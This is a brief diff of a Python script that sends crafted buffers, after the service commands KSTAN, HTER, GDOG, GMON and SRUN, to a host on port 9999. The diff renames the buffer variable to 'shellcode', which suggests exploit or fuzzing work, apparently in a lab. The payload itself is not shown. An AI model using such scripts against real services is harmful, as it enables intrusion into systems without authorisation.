@@ -39,8 +39,8 @@ commands = ["KSTAN", "HTER", "GDOG", "GMON", "SRUN"]
 for i in commands:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.0.102", 9999))
-    p2 = i + " /.:/" + buf
-    s.sendall(p2)
+    shellcode = i + " /.:/" + buf
+    s.sendall(shellcode)
     s.close()
 #s.connect(("192.168.0.102", 9999))
 
